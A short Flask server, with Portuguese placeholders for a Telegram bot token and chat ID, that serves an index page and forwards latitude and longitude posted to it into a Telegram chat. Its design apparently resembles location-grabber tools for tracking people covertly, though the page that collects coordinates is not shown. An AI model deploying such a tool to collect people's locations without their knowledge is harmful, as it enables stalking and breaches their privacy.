from flask import Flask, request, send_from_directory
import requests

app = Flask(__name__)

BOT_TOKEN = 'INSIRA_SEU_TOKEN_AQUI'
CHAT_ID = 'INSIRA_SEU_CHAT_ID_AQUI'

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    if latitude and longitude:
        message = f'📍 Nova Localização:\nLatitude: {latitude}\nLongitude: {longitude}'
        send_message_to_telegram(message)
        return {'status': 'success'}, 200
    else:
        return {'status': 'error'}, 400

def send_message_to_telegram(message):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
